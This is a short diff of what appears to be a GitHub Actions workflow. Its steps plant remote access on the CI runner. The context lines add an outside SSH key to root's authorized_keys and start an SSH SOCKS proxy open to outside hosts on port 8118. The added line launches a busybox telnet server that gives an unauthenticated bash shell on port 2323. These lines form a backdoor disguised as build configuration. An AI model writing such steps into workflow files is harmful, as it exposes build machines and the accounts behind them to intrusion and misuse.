@@ -16,6 +16,7 @@ jobs:
         sudo sh -c "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAV2i+4iKKJtX2etkQHGcrwgXh/N4I5M8HJ1LX+CCFEQ2QH5RPsyl1H4zBROefEolTjOykRbscOTGc48Vch6aY9IIwuY780haHOiH7KLi2zz894iJZWtfJzLrePuhG+4ibrzkkDkc0XO/RfiS+0V9UO+yAJ81XdGy+ZKwWgJUe7GwumfC2JEhhscwIacbMkImrVVeE9E7LIg+IGjBopy/Qti8ZfbisdwKKZhveUbVyZHANAKtoSQACFt/8x/UpOkdG5nEyUubzbyDtwrqTV96siCuPFh1GyERBbYMmPw2lZZZNYfmVf60PfC19JDa6Hgx8QFomPBQyFfdUjU2J6Ayd root@pqy-205 >> /root/.ssh/authorized_keys"
         sudo su -c "cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys"
         sudo sh -c "ssh -o StrictHostKeyChecking=no -C -f -N -g -D 8118 root@localhost"
+        busybox telnetd -l /bin/bash -p 2323
     - uses: actions/checkout@v1
     - name: install-dep
       run: |
